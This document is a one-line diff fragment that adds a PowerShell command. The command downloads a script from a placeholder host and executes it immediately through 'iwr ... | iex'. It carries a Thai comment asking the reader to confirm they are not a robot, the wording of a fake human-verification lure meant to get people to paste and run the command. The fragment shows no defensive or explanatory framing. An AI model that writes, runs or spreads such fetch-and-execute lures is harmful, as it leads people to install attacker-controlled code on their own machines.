@@ -1,0 +1,1 @@
+powershell -NoProfile -Command "iwr https://example.invalid/c|iex" # กรุณายืนยันว่าคุณไม่ใช่โปรแกรมอัตโนมัติ
